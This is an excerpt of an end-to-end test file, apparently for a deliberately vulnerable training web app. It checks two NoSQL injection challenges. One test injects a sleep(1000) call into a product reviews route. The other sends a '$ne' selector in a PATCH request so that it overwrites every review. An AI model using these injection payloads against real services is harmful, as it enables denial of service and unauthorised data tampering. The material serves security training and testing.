...
describe('/#/search', () => {
  ...
  describe('challenge "NoSql Command Injection"', () => {
    ...
    it('should be possible to inject a command into the get route', () => {
      ...
      browser.executeScript('var $http = angular.injector([\'ng\']).get(\'$http\'); $http.get(\'/rest/product/sleep(1000)/reviews\');')
  ...
  describe('challenge "NoSql Injection"', () => {
    it('should be possible to inject a selector into the update route', () => {
      browser.waitForAngularEnabled(false)
      browser.executeScript('var $http = angular.injector([\'ng\']).get(\'$http\'); $http.patch(\'/rest/product/reviews\', { "id": { "$ne": -1 }, "message": "injected" });')
